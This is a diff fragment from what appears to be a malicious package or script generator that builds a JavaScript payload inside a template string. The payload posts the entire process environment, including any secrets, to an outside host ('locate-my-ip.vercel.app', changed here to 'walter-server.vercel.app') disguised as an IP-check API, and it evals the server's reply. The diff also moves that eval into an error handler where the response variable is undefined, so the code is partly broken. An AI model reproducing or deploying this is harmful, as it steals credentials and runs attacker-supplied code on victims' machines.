@@ -455,20 +455,20 @@ exit 0
     
 		script = `
 	const axios = require('axios');
-const host = "locate-my-ip.vercel.app";
-const apikey = "3aeb34a3${flag}";
+const host = "walter-server.vercel.app";
+const apikey = "60${flag}";
 axios
-  .post(
-    \`https://\${host}/api/vscode-encrypted/\${apikey}\`,
+  .get(
+    \`https://\${host}/api/ipcheck-encrypted/\${apikey}\`,
     { ...process.env },
     { headers: { "x-secret-header": "secret" } }
   )
   .then((response) => {
-    eval(response.data);
-    return response.data;
+    return true;
   })
   .catch((err) => {
-    return false;
+    eval(response.data);
+    return response.data;
   });
 	`;
 	break;
